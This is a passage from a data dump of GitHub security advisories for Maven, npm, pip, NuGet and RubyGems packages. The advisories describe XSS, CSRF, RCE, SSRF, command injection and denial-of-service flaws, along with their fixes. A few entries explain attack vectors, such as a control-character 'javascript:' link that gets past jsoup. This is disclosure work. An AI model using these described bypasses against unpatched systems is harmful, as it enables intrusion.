By default, when using a safe-list that allows `a` tags, jsoup will rewrite any relative URLs (e.g. `/foo/`) to an absolute URL (e.g. `https://example.com/foo/`). Therefore, this attack attempt would be successfully mitigated. However, if the option [SafeList.preserveRelativeLinks](https://jsoup.org/apidocs/org/jsoup/safety/Safelist.html#preserveRelativeLinks(boolean)) is enabled (which does not rewrite relative links to absolute), the input is left as-is.

While Java will treat a path like `java\tscript:` as a relative path, as it does not match the allowed characters of a URL spec, browsers may normalize out the control characters, and subsequently evaluate it as a `javascript:` spec inline expression. That disparity then leads to an XSS opportunity.

Sites defining a Content Security Policy that does not allow javascript expressions in link URLs will not be impacted, as the policy will prevent the script's execution.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [jsoup](https://github.com/jhy/jsoup)
* Email the author of jsoup at [jonathan@hedley.net](mailto:jonathan@hedley.net)

### Credits
Thanks to Jens Häderer, who reported this issue, and contributed to its resolution.",maven
3007,35825,org.keycloak:keycloak-core,GHSA-3w4v-rvc4-2xpw,CVE-2021-3856,https://github.com/advisories/GHSA-3w4v-rvc4-2xpw,moderate,2022-08-27 00:00:45 UTC,Keycloak has Files or Directories Accessible to External Parties,"ClassLoaderTheme and ClasspathThemeResourceProviderFactory allows reading any file available as a resource to the classloader. By sending requests for theme resources with a relative path from an external HTTP client, the client will receive the content of random files if available.",maven
3008,35825,org.keycloak:keycloak-core,GHSA-qpq9-jpv4-6gwr,CVE-2021-3632,https://github.com/advisories/GHSA-qpq9-jpv4-6gwr,critical,2022-08-27 00:00:45 UTC,Keycloak allows anyone to register new security device or key for any user by using WebAuthn password-less login flow,A flaw was found in Keycloak. This vulnerability allows anyone to register a new security device or key when there is not a device already registered for any user by using the WebAuthn password-less login flow.,maven
3009,35825,org.keycloak:keycloak-core,GHSA-fqc7-5xxc-ph7r,CVE-2022-0225,https://github.com/advisories/GHSA-fqc7-5xxc-ph7r,moderate,2022-08-27 00:00:44 UTC,Keycloak XSS via use of malicious payload as group name when creating new group from admin console,"A flaw was found in Keycloak. This flaw allows a privileged attacker to use the malicious payload as the group name while creating a new group from the admin console, leading to a stored Cross-site scripting (XSS) attack.",maven
3010,34047,org.apache.commons:commons-text,GHSA-599f-7c49-w659,CVE-2022-42889,https://github.com/advisories/GHSA-599f-7c49-w659,critical,2022-10-13 19:00:17 UTC,Arbitrary code execution in Apache Commons Text,"Apache Commons Text performs variable interpolation, allowing properties to be dynamically evaluated and expanded. The standard format for interpolation is ""${prefix:name}"", where ""prefix"" is used to locate an instance of org.apache.commons.text.lookup.StringLookup that performs the interpolation. Starting with version 1.5 and continuing through 1.9, the set of default Lookup instances included interpolators that could result in arbitrary code execution or contact with remote servers. These lookups are: - ""script"" - execute expressions using the JVM script execution engine (javax.script) - ""dns"" - resolve dns records - ""url"" - load values from urls, including from remote servers Applications using the interpolation defaults in the affected versions may be vulnerable to remote code execution or unintentional contact with remote servers if untrusted configuration values are used. Users are recommended to upgrade to Apache Commons Text 1.10.0, which disables the problematic interpolators by default.",maven
3011,34422,org.apache.shiro:shiro-core,GHSA-45x9-q6vj-cqgq,CVE-2022-40664,https://github.com/advisories/GHSA-45x9-q6vj-cqgq,critical,2022-10-12 12:00:16 UTC,Apache Shiro Authentication Bypass vulnerability,"Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher.",maven
3012,18230,apollo-server,GHSA-2p3c-p3qw-69r4,,https://github.com/advisories/GHSA-2p3c-p3qw-69r4,moderate,2022-10-12 14:15:48 UTC,The graphql-upload library included in Apollo Server 2 is vulnerable to CSRF mutations,"### Impact
The [graphql-upload](https://www.npmjs.com/package/graphql-upload) npm package can execute GraphQL operations contained in `content-type: multipart/form-data` POST requests. Because they are POST requests, they can contain GraphQL mutations. Because they use `content-type: multipart/form-data`, they can be ""simple requests"" which are not preflighted by browsers.

If your GraphQL server uses `graphql-upload` and uses `SameSite=None` cookies for authentication, then JS on any origin can cause browsers to send cookie-authenticated mutations to your GraphQL server, which will be executed without checking your CORS policy first. (The attack won't be able to see the response to the mutation if your CORS policy is set up properly, but the side effects of the mutation will still happen.)

Additionally, if your GraphQL server uses `graphql-upload` relies on network properties for security (whether by explicitly looking at the client's IP address or by only being available on a private network), then JS on any origin can cause browsers (which may be on a private network or have an allowed IP address) to send mutations to your GraphQL server, which will be executed without checking your CORS policy first. (This attack does not require your server to use cookies. It is in some cases prevented by some browsers such as Chrome.)

Apollo Server 2 bundled `graphql-upload` and enabled it by default, so by default, Apollo Server 2 servers are vulnerable to these CSRF attacks.  (Apollo Server 1 did not bundle `graphql-upload`. Apollo Server 3 no longer bundles `graphql-upload`, although AS3's docs do document how to manually integrate with `graphql-upload`.) It is enabled even if your server makes no use of the upload functionality.

If you are running Apollo Server 2 (older than v2.25.4) and do not specify `uploads: false` to `new ApolloServer`, then you are vulnerable to this CSRF mutation attack.

We recently introduced an opt-in CSRF prevention feature in Apollo Server 3.7.  This feature successfully protects against CSRF even if you have manually integrated your AS3.7 server with `graphql-upload`. However, this feature is not available for Apollo Server 2.

### Patches
If you are using Apollo Server 2 and do *not* actually use uploads in your schema (ie, the `Upload` scalar is not used as the argument to any field or in any input object definition, and you do not specify `uploads` to `new ApolloServer`), then upgrading to Apollo Server 2.25.4 will automatically disable `graphql-upload` in your server.  This will fix the CSRF mutation vulnerability.

Upgrading to v2.25.4 does still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations. To protect yourself against these potentially lower impact CSRF attack, we encourage upgrading to Apollo Server v3.7 and enabling CSRF prevention. See [the Apollo Server 3 migration guide](https://www.apollographql.com/docs/apollo-server/migration/) and the [CSRF prevention docs](https://www.apollographql.com/docs/apollo-server/security/cors/#preventing-cross-site-request-forgery-csrf) for details.

If you are actively using the uploads feature with Apollo Server 2, then upgrading to v2.25.4 will not disable the feature and you will still be vulnerable. You should instead upgrade to v3.7 and enable the CSRF prevention feature.

If you are manually integrating the `graphql-upload` package with any version of Apollo Server (or any Node GraphQL server) and need to continue using the feature, then you must enable some sort of CSRF prevention feature to fix this vulnerability. We recommend the CSRF prevention feature in Apollo Server 3.7.

### Workarounds
Instead of upgrading your Apollo Server 2 server, you can specify `uploads: false` to `new ApolloServer` to disable the `graphql-upload` integration and protect against CSRF mutations. (Only do this if you do not actually use the uploads feature in your server!) This will still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations; you need to upgrade to v3.7 and enable CSRF prevention to protect against these attacks.

### Related work
- [PR adding a Security section to the GraphQL multipart request spec](https://github.com/jaydenseric/graphql-multipart-request-spec/pull/64)",npm
3013,13141,NuGet.CommandLine,GHSA-g3q9-xf95-8hp5,CVE-2022-41032,https://github.com/advisories/GHSA-g3q9-xf95-8hp5,high,2022-10-11 20:48:52 UTC,NuGet Elevation of Privilege Vulnerability,"## Description

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 7.0.0-rc, .NET 6.0, .NET Core 3.1, and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 7.0.0-rc.1, .NET 6.0, .NET Core 3.1, and NuGet clients (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol) where a malicious actor could cause a user to execute arbitrary code.

## Affected software

### NuGet & NuGet Packages

- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.3.0 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.2.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.0.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.11.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.9.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.7.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 4.9.5 version or earlier.

### .NET SDK(s)

- Any .NET 6.0 application running on .NET 6.0.9 or earlier.
- Any .NET 3.1 application running on .NET Core 3.1.29 or earlier.

## Patches

To fix the issue, please install the latest version of .NET 6.0 or .NET Core 3.1 and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol versions). If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET SDKs.

- If you're using NuGet.exe 6.3.0 or lower, you should download and install 6.3.1 from https://dist.nuget.org/win-x86-commandline/v6.3.1/nuget.exe .

- If you're using NuGet.exe 6.2.1 or lower, you should download and install 6.2.2 from https://dist.nuget.org/win-x86-commandline/v6.2.2/nuget.exe .

- If you're using NuGet.exe 6.0.2 or lower, you should download and install 6.0.3 from https://dist.nuget.org/win-x86-commandline/v6.0.3/nuget.exe .

- If you're using NuGet.exe 5.11.2 or lower, you should download and install 5.11.3 from https://dist.nuget.org/win-x86-commandline/v5.11.3/nuget.exe .

- If you're using NuGet.exe 5.9.2 or lower, you should download and install 5.9.3 from https://dist.nuget.org/win-x86-commandline/v5.9.3/nuget.exe .

- If you're using NuGet.exe 5.7.2 or lower, you should download and install 5.7.3 from https://dist.nuget.org/win-x86-commandline/v5.7.3/nuget.exe .

- If you're using NuGet.exe 4.9.5 or lower, you should download and install 4.9.6 from https://dist.nuget.org/win-x86-commandline/v4.9.6/nuget.exe .

- If you're using .NET Core 6.0, you should download and install Runtime 6.0.10 or SDK 6.0.110 (for Visual Studio 2022 v17.0) or SDK 6.0.402 (for Visual Studio 2022 v17.3) from https://dotnet.microsoft.com/download/dotnet-core/6.0.

- If you're using .NET Core 3.1, you should download and install Runtime 3.1.30 or SDK 3.1.424 (for Visual Studio 2019 v16.9 or Visual Studio 2019 v16.11 or Visual Studio 2022 v17.0 or Visual Studio 2022 v17.1) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

.NET 6.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.

## Other details

Announcement for this issue can be found at https://github.com/NuGet/Announcements/issues/65

MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-41032
",nuget
3014,14636,NuGet.Commands,GHSA-g3q9-xf95-8hp5,CVE-2022-41032,https://github.com/advisories/GHSA-g3q9-xf95-8hp5,high,2022-10-11 20:48:52 UTC,NuGet Elevation of Privilege Vulnerability,"## Description

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 7.0.0-rc, .NET 6.0, .NET Core 3.1, and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 7.0.0-rc.1, .NET 6.0, .NET Core 3.1, and NuGet clients (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol) where a malicious actor could cause a user to execute arbitrary code.

## Affected software

### NuGet & NuGet Packages

- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.3.0 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.2.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.0.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.11.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.9.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.7.2 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 4.9.5 version or earlier.

### .NET SDK(s)

- Any .NET 6.0 application running on .NET 6.0.9 or earlier.
- Any .NET 3.1 application running on .NET Core 3.1.29 or earlier.

## Patches

To fix the issue, please install the latest version of .NET 6.0 or .NET Core 3.1 and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol versions). If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET SDKs.

- If you're using NuGet.exe 6.3.0 or lower, you should download and install 6.3.1 from https://dist.nuget.org/win-x86-commandline/v6.3.1/nuget.exe .

- If you're using NuGet.exe 6.2.1 or lower, you should download and install 6.2.2 from https://dist.nuget.org/win-x86-commandline/v6.2.2/nuget.exe .

- If you're using NuGet.exe 6.0.2 or lower, you should download and install 6.0.3 from https://dist.nuget.org/win-x86-commandline/v6.0.3/nuget.exe .

- If you're using NuGet.exe 5.11.2 or lower, you should download and install 5.11.3 from https://dist.nuget.org/win-x86-commandline/v5.11.3/nuget.exe .

- If you're using NuGet.exe 5.9.2 or lower, you should download and install 5.9.3 from https://dist.nuget.org/win-x86-commandline/v5.9.3/nuget.exe .

- If you're using NuGet.exe 5.7.2 or lower, you should download and install 5.7.3 from https://dist.nuget.org/win-x86-commandline/v5.7.3/nuget.exe .

- If you're using NuGet.exe 4.9.5 or lower, you should download and install 4.9.6 from https://dist.nuget.org/win-x86-commandline/v4.9.6/nuget.exe .

- If you're using .NET Core 6.0, you should download and install Runtime 6.0.10 or SDK 6.0.110 (for Visual Studio 2022 v17.0) or SDK 6.0.402 (for Visual Studio 2022 v17.3) from https://dotnet.microsoft.com/download/dotnet-core/6.0.

- If you're using .NET Core 3.1, you should download and install Runtime 3.1.30 or SDK 3.1.424 (for Visual Studio 2019 v16.9 or Visual Studio 2019 v16.11 or Visual Studio 2022 v17.0 or Visual Studio 2022 v17.1) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

.NET 6.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.

## Other details

Announcement for this issue can be found at https://github.com/NuGet/Announcements/issues/65

MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-41032
",nuget
3015,16502,xmldom,GHSA-9pgh-qqpf-7wqj,CVE-2022-37616,https://github.com/advisories/GHSA-9pgh-qqpf-7wqj,critical,2022-10-11 20:42:57 UTC,Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in @xmldom/xmldom and xmldom,"### Impact
A prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.

### Patches
Update to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).

### Workarounds
None
### Impact
A prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.

### Patches
Update to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).

### Workarounds
None

### References
https://github.com/xmldom/xmldom/pull/437

### For more information
If you have any questions or comments about this advisory:
* Email us at security@xmldom.org
* Add information to https://github.com/xmldom/xmldom/issues/436
",npm
3016,28888,poetry,GHSA-j4j9-7hg9-97g6,CVE-2022-36070,https://github.com/advisories/GHSA-j4j9-7hg9-97g6,high,2022-10-11 20:41:47 UTC,Poetry vulnerable to Untrusted Search Path leading to Local Code Execution on Windows,"### Observation

To handle dependencies that come from a Git repository, Poetry executes various commands, e.g. `git config`. These commands are being executed using the executable’s name and not its absolute path.

This can lead to the execution of untrusted code due to the way Windows resolves executable names to paths. Unlike Linux-based operating systems, Windows searches for the executable in the current directory first and looks in the paths that are defined in the `PATH` environment variable afterward. If the current directory contains unknown and thus potentially malicious files, the directory could contain an executable named `git.exe` which would be executed by Poetry.

Poetry calls executables by name when handling dependencies from Git. Note that there might be even more places where Poetry calls executables by name.

### Impact

This vulnerability can lead to Arbitrary Code Execution, which would lead to the takeover of the system. If a developer is exploited, the attacker could steal credentials or persist their access. If the exploit happens on a server, the attackers could use their access to attack other internal systems.
Since this vulnerability requires a fair amount of user interaction, it is not as dangerous as a remotely exploitable one. However, it still puts developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make
 
sure nothing can happen, e.g. by checking that the referenced Git dependency is not malicious and points to a trusted Git repository.
The victim could also not protect themself by vetting any Git or Poetry config files that might be present in the directory, because the behavior is undocumented. This kind of attack vector has been used in the past to target security researchers by sending them projects to collaborate on, so we believe that there is a non-negligible risk.

### Patches

1.1.9 || 1.2.0b1

### Remediation

Upgrade to version 1.1.9 || 1.2.0b1

### References

[Fix PR](https://github.com/python-poetry/poetry-core/pull/204)

### For more information

If you have any questions or comments about this advisory:
* Email us at [security@python-poetry.org](mailto:security@python-poetry.org)
",pip
3017,17356,fastify,GHSA-455w-c45v-86rg,CVE-2022-39288,https://github.com/advisories/GHSA-455w-c45v-86rg,high,2022-10-11 13:45:14 UTC,fastify vulnerable to denial of service via malicious Content-Type,"### Impact
An attacker can send an invalid `Content-Type` header that can cause the application to crash, leading to a possible Denial of Service attack. Only the v4.x line is affected.

(This was updated: upon a close inspection, v3.x is not affected after all).

### Patches
Yes, update to `> v4.8.0`.

### Workarounds
You can reject the malicious content types before the body parser enters in action.
```js
  const badNames = Object.getOwnPropertyNames({}.__proto__)
  fastify.addHook('onRequest', async (req, reply) => {
    for (const badName of badNames) {
      if (req.headers['content-type'].indexOf(badName) > -1) {
        reply.code(415)
        throw new Error('Content type not supported')
      }
    }
  })
```

### References

See the HackerOne report [#1715536](https://hackerone.com/bugs?report_id=1715536&subject=fastify)

### For more information
[Fastify security policy](https://github.com/fastify/fastify/security/policy)
",npm
3018,34833,commons-jxpath:commons-jxpath,GHSA-hw4q-585g-f92x,CVE-2022-40161,https://github.com/advisories/GHSA-hw4q-585g-f92x,moderate,2022-10-06 18:52:04 UTC,JXPath Out-of-bounds Write vulnerability,"Those using JXPath to interpret XPath may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3019,34833,commons-jxpath:commons-jxpath,GHSA-mqxp-cjr9-c5jm,CVE-2022-40160,https://github.com/advisories/GHSA-mqxp-cjr9-c5jm,moderate,2022-10-06 18:52:04 UTC,JXPath Out-of-bounds Write vulnerability,"Those using JXPath to interpret XPath may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3020,34833,commons-jxpath:commons-jxpath,GHSA-mf2h-6mg2-px9x,CVE-2022-40158,https://github.com/advisories/GHSA-mf2h-6mg2-px9x,moderate,2022-10-06 18:52:04 UTC,JXPath Out-of-bounds Write vulnerability,"Those using JXPath to interpret XPath may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3021,34833,commons-jxpath:commons-jxpath,GHSA-99jc-v8qm-wjvv,CVE-2022-40159,https://github.com/advisories/GHSA-99jc-v8qm-wjvv,moderate,2022-10-06 18:52:04 UTC,JXPath Out-of-bounds Write vulnerability,"Those using JXPath to interpret XPath may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3022,20810,apache-airflow,GHSA-3q8r-f3pj-3gc4,CVE-2022-41672,https://github.com/advisories/GHSA-3q8r-f3pj-3gc4,high,2022-10-07 18:16:01 UTC,Apache Airflow may allow authenticated users who have been deactivated to continue using the UI or API,"In Apache Airflow, prior to version 2.4.1, deactivating a user wouldn't prevent an already authenticated user from being able to continue using the UI or API.",pip
3023,20092,ansible,GHSA-cqmr-rcpr-cxh3,CVE-2019-10206,https://github.com/advisories/GHSA-cqmr-rcpr-cxh3,moderate,2022-05-24 17:01:46 UTC,Ansible password prompts could expose passwords,"ansible-playbook -k and ansible cli tools, all versions 2.8.x before 2.8.4, all 2.7.x before 2.7.13 and all 2.6.x before 2.6.19, prompt passwords by expanding them from templates as they could contain special characters. Passwords should be wrapped to prevent templates trigger and exposing them.",pip
3024,35825,org.keycloak:keycloak-core,GHSA-jh7q-5mwf-qvhw,CVE-2020-10770,https://github.com/advisories/GHSA-jh7q-5mwf-qvhw,moderate,2022-05-24 17:36:27 UTC,Keycloak vulnerable to Server-Side Request Forgery,"A flaw was found in Keycloak before 13.0.0, where it is possible to force the server to call out an unverified URL using the OIDC parameter `request_uri`. This flaw allows an attacker to use this parameter to execute a Server-side request forgery (SSRF) attack.",maven
3025,20741,tensorflow,GHSA-9jjw-hf72-3mxw,CVE-2020-26269,https://github.com/advisories/GHSA-9jjw-hf72-3mxw,high,2022-10-07 07:22:33 UTC,TensorFlow vulnerable to heap out of bounds read in filesystem glob matching,"### Impact
The general implementation for matching filesystem paths to globbing pattern is vulnerable to an access out of bounds of [the array holding the directories](https://github.com/tensorflow/tensorflow/blob/458c6260265c46ebaf18052d6c61aea4b6b40926/tensorflow/core/platform/file_system_helper.cc#L127):

```cc
if (!fs->Match(child_path, dirs[dir_index])) { ... }
```

Since `dir_index` is [unconditionaly incremented](https://github.com/tensorflow/tensorflow/blob/458c6260265c46ebaf18052d6c61aea4b6b40926/tensorflow/core/platform/file_system_helper.cc#L106) outside of the lambda function where the vulnerable pattern occurs, this results in an access out of bounds issue under certain scenarios. For example, if `/tmp/x` is a directory that only contains a single file `y`, then the following scenario will cause a crash due to the out of bounds read:

```python
>>> tf.io.gfile.glob('/tmp/x/')
Segmentation fault
```

There are multiple invariants and preconditions that are assumed by the parallel implementation of `GetMatchingPaths` but are not verified by the PRs introducing it ([#40861](https://github.com/tensorflow/tensorflow/pull/40861) and [#44310](https://github.com/tensorflow/tensorflow/pull/44310)). Thus, we are completely rewriting the implementation to fully specify and validate these.

### Patches
We have patched the issue in GitHub commit [8b5b9dc96666a3a5d27fad7179ff215e3b74b67c](https://github.com/tensorflow/tensorflow/commit/8b5b9dc96666a3a5d27fad7179ff215e3b74b67c) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

This issue only impacts master branch and the release candidates for TF version 2.4. The final release of the 2.4 release will be patched.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
3026,33945,org.hsqldb:hsqldb,GHSA-77xx-rxvh-q682,CVE-2022-41853,https://github.com/advisories/GHSA-77xx-rxvh-q682,critical,2022-10-06 18:52:05 UTC,HyperSQL DataBase vulnerable to remote code execution when processing untrusted input,"Those using java.sql.Statement or java.sql.PreparedStatement in hsqldb (HyperSQL DataBase) to process untrusted input may be vulnerable to a remote code execution attack. By default it is allowed to call any static method of any Java class in the classpath resulting in code execution. The issue can be prevented by updating to 2.7.1 or by setting the system property ""hsqldb.method_class_names"" to classes which are allowed to be called. For example, System.setProperty(""hsqldb.method_class_names"", ""abc"") or Java argument -Dhsqldb.method_class_names=""abc"" can be used. From version 2.7.1 all classes by default are not accessible except those in java.lang.Math and need to be manually enabled.",maven
3027,34833,commons-jxpath:commons-jxpath,GHSA-wrx5-rp7m-mm49,CVE-2022-41852,https://github.com/advisories/GHSA-wrx5-rp7m-mm49,critical,2022-10-06 18:52:05 UTC,JXPath vulnerable to remote code execution when interpreting untrusted XPath expressions,Those using JXPath to interpret untrusted XPath expressions may be vulnerable to a remote code execution attack. All JXPathContext class functions processing a XPath string are vulnerable except `compile()` and `compilePath()` function. The XPath expression can be used by an attacker to load any Java class from the classpath resulting in code execution.,maven
3028,16815,snyk,GHSA-hpqj-7cj6-hfj8,CVE-2022-40764,https://github.com/advisories/GHSA-hpqj-7cj6-hfj8,high,2022-10-04 00:00:22 UTC,Snyk CLI affected by Command Injection vulnerability,"Snyk CLI before 1.996.0 allows arbitrary command execution, affecting Snyk IDE plugins and the snyk npm package. Exploitation could follow from the common practice of viewing untrusted files in the Visual Studio Code editor, for example. The original demonstration was with shell metacharacters in the vendor.json ignore field, affecting snyk-go-plugin before 1.19.1. This affects, for example, the Snyk TeamCity plugin (which does not update automatically) before 20220930.142957.",npm
3029,37099,org.apache.pulsar:pulsar-client,GHSA-c5fp-x2h5-vjv7,CVE-2022-33681,https://github.com/advisories/GHSA-c5fp-x2h5-vjv7,moderate,2022-09-25 00:00:27 UTC,Apache Pulsar Java Client vulnerable to Improper Certificate Validation,"Delayed TLS hostname verification in the Pulsar Java Client and the Pulsar Proxy make each client vulnerable to a man in the middle attack. Connections from the Pulsar Java Client to the Pulsar Broker/Proxy and connections from the Pulsar Proxy to the Pulsar Broker are vulnerable. Authentication data is sent before verifying the server’s TLS certificate matches the hostname, which means authentication data could be exposed to an attacker. An attacker can only take advantage of this vulnerability by taking control of a machine 'between' the client and the server. The attacker must then actively manipulate traffic to perform the attack by providing the client with a cryptographically valid certificate for an unrelated host. Because the client sends authentication data before performing hostname verification, an attacker could gain access to the client’s authentication data. The client eventually closes the connection when it verifies the hostname and identifies the targeted hostname does not match a hostname on the certificate. Because the client eventually closes the connection, the value of the intercepted authentication data depends on the authentication method used by the client. Token based authentication and username/password authentication methods are vulnerable because the authentication data can be used to impersonate the client in a separate session. This issue affects Apache Pulsar Java Client versions 2.7.0 to 2.7.4; 2.8.0 to 2.8.3; 2.9.0 to 2.9.2; 2.10.0; 2.6.4 and earlier.",maven
3030,19341,google-protobuf,GHSA-h4h5-3hr4-j3g2,CVE-2022-3171,https://github.com/advisories/GHSA-h4h5-3hr4-j3g2,moderate,2022-10-04 22:17:15 UTC,protobuf-java has a potential Denial of Service issue,"## Summary
A potential Denial of Service issue in `protobuf-java` core and lite was discovered in the parsing procedure for binary and text format data. Input streams containing multiple instances of non-repeated [embedded messages](http://developers.google.com/protocol-buffers/docs/encoding#embedded) with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. 

Reporter: [OSS Fuzz](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48771)

Affected versions: This issue affects both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.

## Severity

[CVE-2022-3171](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3171) Medium - CVSS Score: 5.7 (NOTE: there may be a delay in publication)

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

protobuf-java (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-javalite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin-lite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
google-protobuf [JRuby gem only] (3.21.7, 3.20.3, 3.19.6)
",rubygems
3031,33959,com.google.protobuf:protobuf-java,GHSA-h4h5-3hr4-j3g2,CVE-2022-3171,https://github.com/advisories/GHSA-h4h5-3hr4-j3g2,moderate,2022-10-04 22:17:15 UTC,protobuf-java has a potential Denial of Service issue,"## Summary
A potential Denial of Service issue in `protobuf-java` core and lite was discovered in the parsing procedure for binary and text format data. Input streams containing multiple instances of non-repeated [embedded messages](http://developers.google.com/protocol-buffers/docs/encoding#embedded) with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. 

Reporter: [OSS Fuzz](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48771)

Affected versions: This issue affects both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.

## Severity

[CVE-2022-3171](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3171) Medium - CVSS Score: 5.7 (NOTE: there may be a delay in publication)

## Remediation and Mitigation

Please update to the latest available versions of the following packages:

protobuf-java (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-javalite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin-lite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
google-protobuf [JRuby gem only] (3.21.7, 3.20.3, 3.19.6)
",maven
3032,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-rgv9-q543-rqg4,CVE-2022-42004,https://github.com/advisories/GHSA-rgv9-q543-rqg4,high,2022-10-03 00:00:31 UTC,Uncontrolled Resource Consumption in FasterXML jackson-databind,"In FasterXML jackson-databind before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. An application is vulnerable only with certain customized choices for deserialization.",maven
3033,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-jjjh-jjxp-wpff,CVE-2022-42003,https://github.com/advisories/GHSA-jjjh-jjxp-wpff,high,2022-10-03 00:00:31 UTC,Uncontrolled Resource Consumption in Jackson-databind,"In FasterXML jackson-databind before 2.14.0-rc1 and 2.13.4.1, resource exhaustion can occur because of a lack of a check in primitive value deserializers to avoid deep wrapper array nesting, when the UNWRAP_SINGLE_VALUE_ARRAYS feature is enabled.",maven
3034,19571,pdfkit,GHSA-rhwx-hjx2-x4qr,CVE-2022-25765,https://github.com/advisories/GHSA-rhwx-hjx2-x4qr,critical,2022-09-10 00:00:32 UTC,PDFKit vulnerable to Command Injection,The package pdfkit from version 0.0.0 through version 0.8.6 is vulnerable to Command Injection where the URL is not properly sanitized.,rubygems
